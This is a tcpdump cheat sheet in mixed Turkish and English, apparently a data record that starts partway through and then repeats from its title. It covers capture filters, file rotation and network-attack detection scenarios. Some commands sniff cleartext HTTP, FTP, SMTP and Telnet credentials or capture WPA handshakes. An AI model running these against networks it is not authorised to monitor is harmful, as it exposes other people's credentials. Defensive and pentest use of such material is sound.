80: HTTP traffic*\n\n**HTTPS traffic (metadata only):**\n```\ntcpdump -i eth0 -nn 'tcp port 443'\n```\n*-nn: IP ve port sayısal, tcp port 443: HTTPS*\n\n**DNS queries + responses:**\n```\ntcpdump -i eth0 -nn 'udp port 53' -vv\n```\n*-vv: Verbose DNS details*\n\n**Specific subnet:**\n```\ntcpdump -i eth0 'net 192.168.1.0/24'\n```\n*net: Network filter*\n\n**Exclude local traffic:**\n```\ntcpdump -i eth0 'not net 127.0.0.0/8'\n```\n*not: Negation*\n\n**SYN packets only:**\n```\ntcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack = 0'\n```\n*tcp[tcpflags]: TCP flags offset, tcp-syn: SYN flag, tcp-ack: ACK flag*\n\n**TCP port 80 or 443:**\n```\ntcpdump -i eth0 '(tcp port 80) or (tcp port 443)'\n```\n*or: Logical OR*\n\n**Capture to rotating files:**\n```\ntcpdump -i eth0 -C 50 -W 10 -w capture.pcap -Z nobody\n```\n*-C 50: 50MB per file, -W 10: Max 10 files, -Z nobody: Drop privileges*\n\n**ICMP ping capture:**\n```\ntcpdump -i eth0 'icmp[icmptype] = icmp-echo or icmp[icmptype] = icmp-echoreply'\n```\n*icmp[icmptype]: ICMP type offset, icmp-echo: Type 8, icmp-echoreply: Type 0*\n\n**ARP spoofing detection:**\n```\ntcpdump -i eth0 -n arp -e\n```\n*-e: Ethernet header (MAC addresses), arp: ARP protocol*\n\n**SSH traffic:**\n```\ntcpdump -i eth0 'tcp port 22'\n```\n\n**FTP traffic:**\n```\ntcpdump -i eth0 'tcp port 20 or tcp port 21'\n```\n*Port 20: FTP data, Port 21: FTP control*\n\n**SMTP traffic:**\n```\ntcpdump -i eth0 'tcp port 25' -A\n```\n*-A: ASCII (readable email content)*\n\n**Fragmented packets:**\n```\ntcpdump -i eth0 'ip[6:2] & 0x1fff != 0 or ip[6] & 0x20 = 0x20'\n```\n*ip[6:2]: Fragment offset field*\n\n**High traffic capture (metadata only):**\n```\ntcpdump -i eth0 -s 96 -w headers.pcap\n```\n*-s 96: Only headers (no payload)*\n\n**Multiple interfaces:**\n```\ntcpdump -i any 'port 443'\n```\n*-i any: All interfaces*\n\n**Hex dump analysis:**\n```\ntcpdump -i eth0 -XX -c 10 'tcp port 443'\n```\n*-XX: Full hex + link-layer, -c 10: 10 packets*\n\n**Time-based rotation:**\n```\ntcpdump -i eth0 -G 3600 -w /var/log/capture_%Y%m%d_%H%M%S.pcap\n```\n*-G 3600: Rotate every hour, %Y%m%d_%H%M%S: Timestamp format*\n\n**Post-capture compression:**\n```\ntcpdump -i eth0 -C 100 -W 5 -w capture.pcap -z gzip\n```\n*-z gzip: Compress after rotation*\n\n**IPv6 traffic:**\n```\ntcpdump -i eth0 -nn ip6\n```\n*ip6: IPv6 protocol*\n\n## Gerçek Pentest Senaryoları\n\n### Senaryo 1: Port Scanning Tespiti\n\n**SYN scan detection:**\n```\ntcpdump -i eth0 -nn 'tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack = 0'\n```\n*SYN flag set, ACK flag unset*\n\n**Count SYN packets per source:**\n```\ntcpdump -i eth0 -nn 'tcp[tcpflags] = tcp-syn' | awk '{print $3}' | cut -d'.' -f1-4 | sort | uniq -c | sort -rn\n```\n\n**Detect port sweep:**\n```\ntcpdump -i eth0 -nn 'tcp[tcpflags] = tcp-syn' | awk '{print $5}' | cut -d'.' -f5 | cut -d':' -f1 | sort -u | wc -l\n```\n\n### Senaryo 2: SYN Flood & RST Flood Analizi\n\n**SYN flood monitoring:**\n```\ntcpdump -i eth0 -nn 'tcp[tcpflags] = tcp-syn' -c 10000 -w syn-flood.pcap\n```\n\n**Count SYN rate:**\n```\ntcpdump -i eth0 -nn -tttt 'tcp[tcpflags] = tcp-syn' | awk '{print $1}' | uniq -c\n```\n\n**RST flood detection:**\n```\ntcpdump -i eth0 -nn 'tcp[tcpflags] & tcp-rst != 0' -c 5000\n```\n\n**Analyze RST source:**\n```\ntcpdump -i eth0 -nn 'tcp[tcpflags] & tcp-rst != 0' | awk '{print $3}' | cut -d'.' -f1-4 | sort | uniq -c | sort -rn\n```\n\n### Senaryo 3: DNS Trafik İncelemesi\n\n**All DNS:**\n```\ntcpdump -i eth0 -nn 'udp port 53' -vv\n```\n\n**DNS queries only:**\n```\ntcpdump -i eth0 -nn 'udp port 53 and udp[10] & 0x80 = 0'\n```\n\n**DNS responses:**\n```\ntcpdump -i eth0 -nn 'udp port 53 and udp[10] & 0x80 = 0x80'\n```\n\n**Extract queried domains:**\n```\ntcpdump -i eth0 -nn 'udp port 53' | grep -oP 'A\\? \\K[^ ]+'\n```\n\n**DNS tunneling detection (large queries):**\n```\ntcpdump -i eth0 'udp port 53 and greater 512' -w dns-tunnel.pcap\n```\n\n### Senaryo 4: TLS Handshake Yakalama\n\n**Client Hello:**\n```\ntcpdump -i eth0 'tcp port 443 and tcp[20] = 0x16 and tcp[25] = 0x01'\n```\n\n**Server Hello:**\n```\ntcpdump -i eth0 'tcp port 443 and tcp[20] = 0x16 and tcp[25] = 0x02'\n```\n\n**Full TLS handshake:**\n```\ntcpdump -i eth0 -s 0 'tcp port 443' -w tls-handshake.pcap\n```\n\n**SNI extraction:**\n```\ntcpdump -i eth0 -nn -A 'tcp port 443 and tcp[20] = 0x16' | grep -oP 'server_name.*'\n```\n\n### Senaryo 5: Credential Leak Tespiti\n\n**HTTP Basic Auth:**\n```\ntcpdump -i eth0 -nn -A 'tcp port 80' | grep -i 'authorization: basic'\n```\n\n**FTP credentials:**\n```\ntcpdump -i eth0 -nn -A 'tcp port 21' | grep -iE '(USER|PASS)'\n```\n\n**SMTP credentials:**\n```\ntcpdump -i eth0 -nn -A 'tcp port 25' | grep -i 'AUTH'\n```\n\n**Telnet credentials:**\n```\ntcpdump -i eth0 -nn -A 'tcp port 23'\n```\n\n**HTTP POST data:**\n```\ntcpdump -i eth0 -nn -A 'tcp port 80 and tcp[32:4] = 0x504f5354'\n```\n*POST in hex*\n\n### Senaryo 6: DHCP Starvation / Rogue DHCP Tespiti\n\n**All DHCP:**\n```\ntcpdump -i eth0 -nn 'udp port 67 or udp port 68' -vv\n```\n\n**DHCP DISCOVER:**\n```\ntcpdump -i eth0 'udp port 67 and udp[8] = 0x01'\n```\n\n**DHCP OFFER:**\n```\ntcpdump -i eth0 'udp port 68 and udp[8] = 0x02'\n```\n\n**Rogue DHCP server detection:**\n```\ntcpdump -i eth0 -e 'udp port 67' | awk '{print $2}' | sort -u\n```\n\n### Senaryo 7: MITM Saldırı Analizi\n\n**ARP cache poisoning:**\n```\ntcpdump -i eth0 -nn arp -e\n```\n\n**Detect duplicate IP:**\n```\ntcpdump -i eth0 -nn arp | grep 'is-at' | awk '{print $7, $9}' | sort | uniq -c | sort -rn\n```\n\n**Monitor MAC changes:**\n```\ntcpdump -i eth0 -nn -e 'arp' | awk '{print $3, $7, $9}'\n```\n\n### Senaryo 8: ARP Spoofing Tespiti\n\n**ARP traffic:**\n```\ntcpdump -i eth0 -nn arp -e\n```\n\n**ARP requests:**\n```\ntcpdump -i eth0 'arp[6:2] = 1'\n```\n\n**ARP replies:**\n```\ntcpdump -i eth0 'arp[6:2] = 2'\n```\n\n**Gratuitous ARP:**\n```\ntcpdump -i eth0 -nn arp | grep 'Reply.*is-at' | awk '{if($4==$6) print}'\n```\n\n### Senaryo 9: ICMP Tunnel / Covert Channel Detection\n\n**ICMP traffic:**\n```\ntcpdump -i eth0 -nn icmp -vv\n```\n\n**Large ICMP payloads:**\n```\ntcpdump -i eth0 'icmp and greater 100'\n```\n\n**ICMP with data:**\n```\ntcpdump -i eth0 -X 'icmp'\n```\n\n**Detect ICMP tunneling:**\n```\ntcpdump -i eth0 'icmp[icmptype] = icmp-echo and greater 64' -w icmp-tunnel.pcap\n```\n\n### Senaryo 10: Belirli Protokol Yakalama\n\n**SIP (VoIP):**\n```\ntcpdump -i eth0 'udp port 5060 or tcp port 5060' -A\n```\n\n**RTP (media):**\n```\ntcpdump -i eth0 'udp portrange 10000-20000'\n```\n\n**SNMP:**\n```\ntcpdump -i eth0 'udp port 161 or udp port 162'\n```\n\n**BGP:**\n```\ntcpdump -i eth0 'tcp port 179'\n```\n\n**OSPF:**\n```\ntcpdump -i eth0 'proto ospf'\n```\n\n### Senaryo 11: IoT Cihaz Trafiği İncelemesi\n\n**MQTT:**\n```\ntcpdump -i eth0 'tcp port 1883 or tcp port 8883'\n```\n\n**CoAP:**\n```\ntcpdump -i eth0 'udp port 5683'\n```\n\n**mDNS:**\n```\ntcpdump -i eth0 'udp port 5353'\n```\n\n**UPnP/SSDP:**\n```\ntcpdump -i eth0 'udp port 1900'\n```\n\n### Senaryo 12: WPA/WPA2 Handshake Yakalama\n\n**Monitor mode capture:**\n```\ntcpdump -i wlan0mon -w wpa-handshake.pcap\n```\n\n**EAPOL (4-way handshake):**\n```\ntcpdump -i wlan0mon 'ether proto 0x888e' -w handshake.pcap\n```\n\n### Senaryo 13: VPN Trafik Analizi\n\n**IPsec ESP:**\n```\ntcpdump -i eth0 'proto esp'\n```\n\n**IKE:**\n```\ntcpdump -i eth0 'udp port 500 or udp port 4500'\n```\n\n**OpenVPN:**\n```\ntcpdump -i eth0 'udp port 1194'\n```\n\n**WireGuard:**\n```\ntcpdump -i eth0 'udp port 51820'\n```\n\n### Senaryo 14: Internal Lateral Movement Tespiti\n\n**SMB traffic:**\n```\ntcpdump -i eth0 'tcp port 445 or tcp port 139'\n```\n\n**RDP:**\n```\ntcpdump -i eth0 'tcp port 3389'\n```\n\n**WinRM:**\n```\ntcpdump -i eth0 'tcp port 5985 or tcp port 5986'\n```\n\n**PSExec detection:**\n```\ntcpdump -i eth0 'tcp port 445' -A | grep -i 'psexe'\n```\n\n### Senaryo 15: Firewall Drop Analizi\n\n**ICMP unreachable:**\n```\ntcpdump -i eth0 'icmp[icmptype] = icmp-unreach'\n```\n\n**TCP RST from firewall:**\n```\ntcpdump -i eth0 'tcp[tcpflags] & tcp-rst != 0' -nn\n```\n\n**Admin prohibited:**\n```\ntcpdump -i eth0 'icmp[icmptype] = 3 and icmp[icmpcode] = 13'\n```\n\n## Best Practices\n\n**1. Snaplen Doğru Ayarı:**\n\n**Full packet (analysis):**\n```\ntcpdump -i eth0 -s 0\n```\n\n**Header only (high traffic):**\n```\ntcpdump -i eth0 -s 96\n```\n\n**MTU-based:**\n```\ntcpdump -i eth0 -s 1500\n```\n\n**2. Promiscuous Mode Optimizasyonu:**\n\n**Default (enable):**\n```\ntcpdump -i eth0\n```\n\n**Disable (own traffic only):**\n```\ntcpdump -i eth0 -p\n```\n\n**3. Interface Buffer Overflow Engelleme:**\n\n**Increase buffer:**\n```\ntcpdump -i eth0 -B 8192\n```\n\n**Monitor drops:**\n```\ntcpdump -i eth0 -B 4096 -vv\n# Check "X packets dropped by kernel"\n```\n\n**4. High Traffic Environment Rotation:**\n\n**Size-based:**\n```\ntcpdump -i eth0 -C 100 -W 20 -w /var/log/capture.pcap -Z tcpdump\n```\n\n**Time-based:**\n```\ntcpdump -i eth0 -G 3600 -w /var/log/capture_%Y%m%d_%H%M.pcap -Z tcpdump\n```\n\n**5. Yüksek Hızda Sadece Metadata:**\n\n**Headers only:**\n```\ntcpdump -i eth0 -s 96 -w headers.pcap\n```\n\n**Quick output:**\n```\ntcpdump -i eth0 -q -nn\n```\n\n**6. BPF Filtrelerinin Performans Optimizasyonu:**\n\n**Efficient filter:**\n```\ntcpdump -i eth0 'tcp port 80 or tcp port 443'\n```\n\n**Less efficient:**\n```\ntcpdump -i eth0 | grep -E '(80|443)'\n```\n\n**Pre-compile BPF:**\n```\ntcpdump -d 'tcp port 80' > filter.bpf\n```\n\n**7. Kernel Filtering → User Space Filtering:**\n\n**Kernel (efficient):**\n```\ntcpdump -i eth0 'tcp port 80'\n```\n\n**User-space (inefficient):**\n```\ntcpdump -i eth0 | grep ':80'\n```\n\n**8. Offline Pcap Analizi Workflow:**\n\n**Extract specific traffic:**\n```\ntcpdump -r large.pcap 'tcp port 443' -w https.pcap\n```\n\n**Filter by time:**\n```\ntcpdump -r capture.pcap -tttt | awk '$1" "$2 >= "2024-01-01 10:00:00"'\n```\n\n**Statistics:**\n```\ntcpdump -r capture.pcap -qn | awk '{print $3}' | cut -d'.' -f1-4 | sort | uniq -c\n```\n\n**9. SIEM / Packet Broker Entegrasyonu:**\n\n**Syslog format:**\n```\ntcpdump -i eth0 -l -nn | logger -t tcpdump\n```\n\n**JSON output (with script):**\n```\ntcpdump -i eth0 -l -nn | awk '{print "{\\"timestamp\\":\\""$1"\\",\\"src\\":\\""$3"\\",\\"dst\\":\\""$5"\\"}"}'\n```\n\n**10. Live Debugging Minimal Filtration:**\n\n**Monitor specific host:**\n```\ntcpdump -i eth0 -nn host 192.168.1.100\n```\n\n**Exclude noise:**\n```\ntcpdump -i eth0 -nn 'not port 22 and not arp'\n```\n\n## Sık Yapılan Hatalar\n\n**1. Snaplen düşük bırakmak:**\n```\n# YANLIŞ (truncated packets)\ntcpdump -i eth0 -s 64\n\n# DOĞRU\ntcpdump -i eth0 -s 0\n```\n\n**2. DNS/port resolution açık:**\n```\n# YANLIŞ (slow)\ntcpdump -i eth0\n\n# DOĞRU\ntcpdump -i eth0 -nn\n```\n\n**3. Buffer küçük:**\n```\n# YANLIŞ (dropped packets)\ntcpdump -i eth0\n\n# DOĞRU\ntcpdump -i eth0 -B 4096\n```\n\n**4. Filtre yazmadan capture:**\n```\n# YANLIŞ (huge file)\ntcpdump -i eth0 -w capture.pcap\n\n# DOĞRU\ntcpdump -i eth0 'port 80 or port 443' -w capture.pcap\n```\n\n**5. Promiscuous mode yanlış:**\n```\n# YANLIŞ (switch'te çalışmaz)\ntcpdump -i eth0 -p\n\n# DOĞRU (monitor all)\ntcpdump -i eth0\n```\n\n**6. Rotate kullanmadan uzun capture:**\n```\n# YANLIŞ (single huge file)\ntcpdump -i eth0 -w capture.pcap\n\n# DOĞRU\ntcpdump -i eth0 -C 100 -W 10 -w capture.pcap\n```\n\n**7. Multi-interface fark etmemek:**\n```\n# YANLIŞ (single interface)\ntcpdump -i eth0\n\n# DOĞRU (all interfaces)\ntcpdump -i any\n```\n\n**8. IPv6 trafiğini ihmal etmek:**\n```\n# YANLIŞ (IPv4 only)\ntcpdump -i eth0 ip\n\n# DOĞRU (both)\ntcpdump -i eth0 'ip or ip6'\n```\n\n**9. VLAN-tagged paketleri kaçırmak:**\n```\n# YANLIŞ (VLAN unaware)\ntcpdump -i eth0 'tcp port 80'\n\n# DOĞRU\ntcpdump -i eth0 'vlan and tcp port 80'\n```\n\n**10. Privilege drop unutmak:**\n```\n# YANLIŞ (security risk)\ntcpdump -i eth0 -w /tmp/capture.pcap\n\n# DOĞRU\ntcpdump -i eth0 -w /tmp/capture.pcap -Z nobody\n```\n\n## BPF Filter Referansı\n\n**Primitives:**\n```\nhost        # IP address\nnet         # Network\nport        # Port number\nportrange   # Port range\nsrc         # Source\ndst         # Destination\nproto       # Protocol (tcp, udp, icmp, etc.)\n```\n\n**Qualifiers:**\n```\ntcp         # TCP protocol\nudp         # UDP protocol\nicmp        # ICMP protocol\nip          # IPv4\nip6         # IPv6\narp         # ARP\nether       # Ethernet\nvlan        # VLAN tagged\n```\n\n**Operators:**\n```\nand (&&)    # Logical AND\nor (||)     # Logical OR\nnot (!)     # Logical NOT\n```\n\n**Examples:**\n```\ntcp and port 80\nnot arp and not icmp\nhost 192.168.1.1 and (port 80 or port 443)\n```\n\n## İpuçları\n\n**Interface list:**\n```\ntcpdump -D\n```\n\n**BPF syntax check:**\n```\ntcpdump -d 'tcp port 80'\n```\n\n**Packet count:**\n```\ntcpdump -r capture.pcap | wc -l\n```\n\n**File info:**\n```\ntcpdump -r capture.pcap -nn -c 1\n```\n\n**Convert to text:**\n```\ntcpdump -r capture.pcap -nn -tttt > capture.txt\n```\n\n**Split by protocol:**\n```\ntcpdump -r capture.pcap 'tcp' -w tcp.pcap\ntcpdump -r capture.pcap 'udp' -w udp.pcap\n```\n	# Tcpdump - Advanced Packet Analysis\n\n## Temel Kullanım\n\n### Basit Trafik Yakalama\n\n**Tüm trafiği yakala:**\n```\ntcpdump\n```\n\n**Interface seçimi:**\n```\ntcpdump -i eth0\n```\n\n**Belirli sayıda paket:**\n```\ntcpdump -c 100\n```\n\n### IP, Port, Protokol Filtreleri\n\n**Specific IP:**\n```\ntcpdump host 192.168.1.100\n```\n\n**Source IP:**\n```\ntcpdump src 192.168.1.100\n```\n\n**Destination IP:**\n```\ntcpdump dst 192.168.1.100\n```\n\n**Port filtreleme:**\n```\ntcpdump port 80\n```\n\n**Kaynak port:**\n```\ntcpdump src port 443\n```\n\n**Hedef port:**\n```\ntcpdump dst port 22\n```\n\n**Port range:**\n```\ntcpdump portrange 1000-2000\n```\n\n**Protokol:**\n```\ntcpdump tcp\ntcpdump udp\ntcpdump icmp\n```\n\n### Interface Seçimi\n\n**List interfaces:**\n```\ntcpdump -D\n```\n\n**Specific interface:**\n```\ntcpdump -i eth0\n```\n\n**Any interface:**\n```\ntcpdump -i any\n```\n\n### Output Yönlendirme\n\n**Pcap dosyasına kaydet:**\n```\ntcpdump -w capture.pcap\n```\n\n**Dosyadan oku:**\n```\ntcpdump -r capture.pcap\n```\n\n**Canlı göster + kaydet:**\n```\ntcpdump -w capture.pcap -v\n```\n\n### Timestamps\n\n**Default timestamp:**\n```\ntcpdump -t\n```\n\n**Readable timestamp:**\n```\ntcpdump -tttt\n```\n\n**Delta timestamp:**\n```\ntcpdump -ttt\n```\n\n**Unix epoch:**\n```\ntcpdump -tt\n```\n\n### Pcap Kayıt Alma\n\n**Basit kayıt:**\n```\ntcpdump -i eth0 -w output.pcap\n```\n\n**Verbose kayıt:**\n```\ntcpdump -i eth0 -vv -w detailed.pcap\n```\n\n**Filtered capture:**\n```\ntcpdump -i eth0 port 80 -w http.pcap\n```\n\n## İleri Seviye Kullanım\n\n### Berkeley Packet Filter (BPF) Sözdizimi\n\n**TCP SYN flags:**\n```\ntcpdump 'tcp[tcpflags] & tcp-syn != 0'\n```\n\n**TCP ACK flags:**\n```\ntcpdump 'tcp[tcpflags] & tcp-ack != 0'\n```\n\n**Specific byte offset:**\n```\ntcpdump 'ip[8] = 64'\n```\n*TTL = 64*\n\n**TCP payload contains string:**\n```\ntcpdump -A 'tcp[20:4] = 0x47455420'\n```\n*"GET " in ASCII*\n\n**UDP packet size:**\n```\ntcpdump 'udp and greater 1000'\n```\n\n### Kombine Filtreler (and, or, not)\n\n**AND:**\n```\ntcpdump 'host 192.168.1.1 and port 80'\n```\n\n**OR:**\n```\ntcpdump 'tcp port 80 or tcp port 443'\n```\n\n**NOT:**\n```\ntcpdump 'not host 192.168.1.1'\n```\n\n**Complex:**\n```\ntcpdump '(tcp port 80 or tcp port 443) and host 192.168.1.100'\n```\n\n**Exclude subnet:**\n```\ntcpdump 'not net 192.168.0.0/16'\n```\n\n### VLAN, MPLS, GRE, PPP, VXLAN Yakalama\n\n**VLAN tagged:**\n```\ntcpdump -i eth0 vlan\n```\n\n**Specific VLAN ID:**\n```\ntcpdump 'vlan 100'\n```\n\n**MPLS:**\n```\ntcpdump -i eth0 mpls\n```\n\n**GRE encapsulated:**\n```\ntcpdump 'proto gre'\n```\n\n**VXLAN:**\n```\ntcpdump 'udp port 4789'\n```\n\n**PPP:**\n```\ntcpdump -i ppp0\n```\n\n### DNS, DHCP, TLS, TCP Handshake Analiz Filtreleri\n\n**DNS queries:**\n```\ntcpdump -i eth0 'udp port 53'\n```\n\n**DNS responses:**\n```\ntcpdump -i eth0 'udp port 53 and udp[10] & 0x80 = 0x80'\n```\n\n**DHCP traffic:**\n```\ntcpdump -i eth0 'udp port 67 or udp port 68'\n```\n\n**DHCP DISCOVER:**\n```\ntcpdump -i eth0 'udp port 67 and udp[8] = 0x01'\n```\n\n**TLS handshake (Client Hello):**\n```\ntcpdump -i eth0 'tcp port 443 and tcp[20] = 0x16'\n```\n\n**TCP SYN:**\n```\ntcpdump 'tcp[tcpflags] = tcp-syn'\n```\n\n**TCP SYN-ACK:**\n```\ntcpdump 'tcp[tcpflags] & (tcp-syn|tcp-ack) = (tcp-syn|tcp-ack)'\n```\n\n**TCP RST:**\n```\ntcpdump 'tcp[tcpflags] & tcp-rst != 0'\n```\n\n**TCP FIN:**\n```\ntcpdump 'tcp[tcpflags] & tcp-fin != 0'\n```\n\n### Fragmented Packet Yakalama\n\n**IP fragments:**\n```\ntcpdump 'ip[6:2] & 0x1fff != 0'\n```\n\n**First fragment:**\n```\ntcpdump 'ip[6] & 0x20 = 0x20'\n```\n\n**More fragments:**\n```\ntcpdump 'ip[6] & 0x20 = 0x20 or ip[6:2] & 0x1fff != 0'\n```\n\n### Promiscuous Mode\n\n**Enable (default):**\n```\ntcpdump -i eth0\n```\n\n**Disable promiscuous:**\n```\ntcpdump -i eth0 -p\n```\n\n**Monitor mode (wireless):**\n```\ntcpdump -i wlan0mon\n```\n\n### Snaplen Tuning\n\n**Default (262144 bytes):**\n```\ntcpdump -i eth0\n```\n\n**Custom snaplen (1500 bytes):**\n```\ntcpdump -i eth0 -s 1500\n```\n\n**Full packet (0 = unlimited):**\n```\ntcpdump -i eth0 -s 0\n```\n\n**Header only (96 bytes):**\n```\ntcpdump -i eth0 -s 96\n```\n\n### Paketleri Hex/Raw Dump Formatında İnceleme\n\n**Hex + ASCII:**\n```\ntcpdump -i eth0 -X\n```\n\n**Full hex:**\n```\ntcpdump -i eth0 -XX\n```\n\n**ASCII only:**\n```\ntcpdump -i eth0 -A\n```\n\n**Hex dump with link-layer:**\n```\ntcpdump -i eth0 -XX -vv\n```\n\n### Interface Buffer Tuning\n\n**Increase buffer (MB):**\n```\ntcpdump -i eth0 -B 4096\n```\n\n**Buffer size (KB):**\n```\ntcpdump -i eth0 -B 8192\n```\n\n### Ring Buffer Kayıt\n\n**File rotation by size:**\n```\ntcpdump -i eth0 -C 100 -W 5 -w capture.pcap\n```\n*100MB per file, 5 files max*\n\n**Time-based rotation:**\n```\ntcpdump -i eth0 -G 3600 -w capture_%Y%m%d_%H%M%S.pcap\n```\n*Rotate every hour*\n\n### File Rotation (-C, -W)\n\n**Size-based:**\n```\ntcpdump -i eth0 -C 50 -W 10 -w output.pcap\n```\n*50MB files, max 10 files*\n\n**With compression:**\n```\ntcpdump -i eth0 -C 100 -W 5 -w capture.pcap -z gzip\n```\n\n**Post-rotate command:**\n```\ntcpdump -i eth0 -C 100 -W 5 -w capture.pcap -z '/path/to/script.sh'\n```\n\n### Ağdaki Only-Control-Plane Trafik Analizi\n\n**Routing protocols (OSPF, BGP, EIGRP):**\n```\ntcpdump 'proto ospf or tcp port 179'\n```\n\n**LLDP:**\n```\ntcpdump -i eth0 'ether proto 0x88cc'\n```\n\n**CDP (Cisco Discovery Protocol):**\n```\ntcpdump -i eth0 'ether dst 01:00:0c:cc:cc:cc'\n```\n\n**STP (Spanning Tree):**\n```\ntcpdump -i eth0 'ether dst 01:80:c2:00:00:00'\n```\n\n### IPv6 Özel Filtreleri\n\n**All IPv6:**\n```\ntcpdump ip6\n```\n\n**IPv6 ICMPv6:**\n```\ntcpdump 'ip6 and icmp6'\n```\n\n**IPv6 specific address:**\n```\ntcpdump 'ip6 host 2001:db8::1'\n```\n\n**IPv6 Router Advertisement:**\n```\ntcpdump 'icmp6 and ip6[40] = 134'\n```\n\n**IPv6 Neighbor Discovery:**\n```\ntcpdump 'icmp6 and (ip6[40] = 135 or ip6[40] = 136)'\n```\n\n### ARP, ICMP, ICMPv6 Detaylı Yakalama\n\n**ARP requests:**\n```\ntcpdump -i eth0 arp\n```\n\n**ARP request only:**\n```\ntcpdump 'arp[6:2] = 1'\n```\n\n**ARP reply:**\n```\ntcpdump 'arp[6:2] = 2'\n```\n\n**ICMP echo request:**\n```\ntcpdump 'icmp[icmptype] = icmp-echo'\n```\n\n**ICMP echo reply:**\n```\ntcpdump 'icmp[icmptype] = icmp-echoreply'\n```\n\n**ICMP unreachable:**\n```\ntcpdump 'icmp[icmptype] = icmp-unreach'\n```\n\n**ICMPv6:**\n```\ntcpdump 'ip6 and icmp6'\n```\n\n### SYN/ACK/RST Bazlı Saldırı Tespiti\n\n**SYN flood detection:**\n```\ntcpdump 'tcp[tcpflags] = tcp-syn' -c 1000\n```\n\n**SYN without ACK (potential scan):**\n```\ntcpdump 'tcp[tcpflags] = tcp-syn and not tcp[tcpflags] & tcp-ack'\n```\n\n**RST flood:**\n```\ntcpdump 'tcp[tcpflags] & tcp-rst != 0'\n```\n\n**SYN-ACK without prior SYN:**\n```\ntcpdump 'tcp[tcpflags] & (tcp-syn|tcp-ack) = (tcp-syn|tcp-ack)'\n```\n\n**Port scan detection (many SYN to different ports):**\n```\ntcpdump 'tcp[tcpflags] = tcp-syn' -nn | awk '{print $5}' | cut -d'.' -f5 | sort | uniq -c\n```\n\n### Tcpdump + Grep + Awk Pipeline\n\n**Extract IPs:**\n```\ntcpdump -n -r capture.pcap | awk '{print $3}' | cut -d'.' -f1-4 | sort -u\n```\n\n**HTTP GET requests:**\n```\ntcpdump -A -s 0 'tcp port 80' | grep -i 'GET'\n```\n\n**Count packets per IP:**\n```\ntcpdump -nn -r capture.pcap | awk '{print $3}' | cut -d'.' -f1-4 | sort | uniq -c | sort -rn\n```\n\n**Extract User-Agent:**\n```\ntcpdump -A -s 0 'tcp port 80' | grep -oP 'User-Agent: \\K.*'\n```\n\n**DNS query statistics:**\n```\ntcpdump -nn 'udp port 53' | grep -oP '\\? \\K[^ ]+' | sort | uniq -c | sort -rn\n```\n\n### Live Trafik + Offline Pcap Analysis\n\n**Capture:**\n```\ntcpdump -i eth0 -w capture.pcap -C 100 -W 10\n```\n\n**Offline analysis:**\n```\ntcpdump -r capture.pcap 'tcp port 443'\ntcpdump -r capture.pcap -nn 'host 192.168.1.100'\n```\n\n**Read + filter:**\n```\ntcpdump -r large.pcap 'tcp[tcpflags] & tcp-syn != 0' -w syn-packets.pcap\n```\n\n### Tcpdump → Wireshark Workflow\n\n**Capture for Wireshark:**\n```\ntcpdump -i eth0 -s 0 -w capture.pcap\n```\n\n**Wireshark open:**\n```\nwireshark capture.pcap\n```\n\n**Tshark analysis:**\n```\ntshark -r capture.pcap -Y 'http.request.method == "GET"'\n```\n\n## Argument Referansı\n\n### Temel Argümanlar\n\n**`-i <interface>`**\n*Interface seçimi.*\n```\ntcpdump -i eth0\n```\n\n**`-n`**\n*Hostname resolution kapatma.*\n```\ntcpdump -n\n```\n\n**`-nn`**\n*Hostname + port service resolution kapatma.*\n```\ntcpdump -nn\n```\n\n**`-v`**\n*Verbose output.*\n```\ntcpdump -v\n```\n\n**`-vv`**\n*Very verbose.*\n```\ntcpdump -vv\n```\n\n**`-vvv`**\n*Maximum verbosity.*\n```\ntcpdump -vvv\n```\n\n**`-w <file>`**\n*Pcap dosyasına yazma.*\n```\ntcpdump -w output.pcap\n```\n\n**`-r <file>`**\n*Pcap dosyasından okuma.*\n```\ntcpdump -r input.pcap\n```\n\n**`-c <count>`**\n*Yakalanacak paket sayısı.*\n```\ntcpdump -c 100\n```\n\n**`host <address>`**\n*IP/hostname filtresi.*\n```\ntcpdump host 192.168.1.1\n```\n\n**`src <address>`**\n*Kaynak filtresi.*\n```\ntcpdump src 192.168.1.1\n```\n\n**`dst <address>`**\n*Hedef filtresi.*\n```\ntcpdump dst 192.168.1.1\n```\n\n**`port <port>`**\n*Port filtresi.*\n```\ntcpdump port 80\n```\n\n**`portrange <range>`**\n*Port aralığı.*\n```\ntcpdump portrange 1000-2000\n```\n\n**`proto <protocol>`**\n*Protokol (tcp, udp, icmp, arp, ip, ip6).*\n```\ntcpdump tcp\n```\n\n### Zaman & Format Argümanları\n\n**`-t`**\n*Timestamp gösterme.*\n```\ntcpdump -t\n```\n\n**`-tt`**\n*Unix epoch timestamp.*\n```\ntcpdump -tt\n```\n\n**`-ttt`**\n*Delta timestamp (önceki paketten geçen süre).*\n```\ntcpdump -ttt\n```\n\n**`-tttt`**\n*Readable timestamp (YYYY-MM-DD HH:MM:SS).*\n```\ntcpdump -tttt\n```\n\n**`-ttttt`**\n*Delta timestamp + mikrosaniye.*\n```\ntcpdump -ttttt\n```\n\n**`-X`**\n*Hex + ASCII dump.*\n```\ntcpdump -X\n```\n\n**`-XX`**\n*Full hex dump (link-layer dahil).*\n```\ntcpdump -XX\n```\n\n**`-A`**\n*ASCII dump.*\n```\ntcpdump -A\n```\n\n**`-S`**\n*Absolute TCP sequence numbers.*\n```\ntcpdump -S\n```\n\n**`-e`**\n*Link-layer header (Ethernet).*\n```\ntcpdump -e\n```\n\n**`-E <algo:secret>`**\n*IPsec ESP decrypt.*\n```\ntcpdump -E 'aes-cbc:0x1234567890abcdef'\n```\n\n### Performans Argümanları\n\n**`-s <snaplen>`**\n*Snaplen (yakalanacak paket boyutu).*\n```\ntcpdump -s 1500\n```\n*0 = unlimited*\n\n**`-B <size>`**\n*Kernel buffer boyutu (KB).*\n```\ntcpdump -B 4096\n```\n\n**`-p`**\n*Promiscuous mode devre dışı.*\n```\ntcpdump -p\n```\n\n**`-Z <user>`**\n*User privilege drop.*\n```\ntcpdump -Z nobody\n```\n\n**`-d`**\n*BPF program dump (human-readable).*\n```\ntcpdump -d 'tcp port 80'\n```\n\n**`-dd`**\n*BPF program dump (C format).*\n```\ntcpdump -dd 'tcp port 80'\n```\n\n**`-ddd`**\n*BPF program dump (decimal).*\n```\ntcpdump -ddd 'tcp port 80'\n```\n\n### File Rotation & Long Capture\n\n**`-C <size>`**\n*Max file size (MB).*\n```\ntcpdump -C 100 -w output.pcap\n```\n\n**`-W 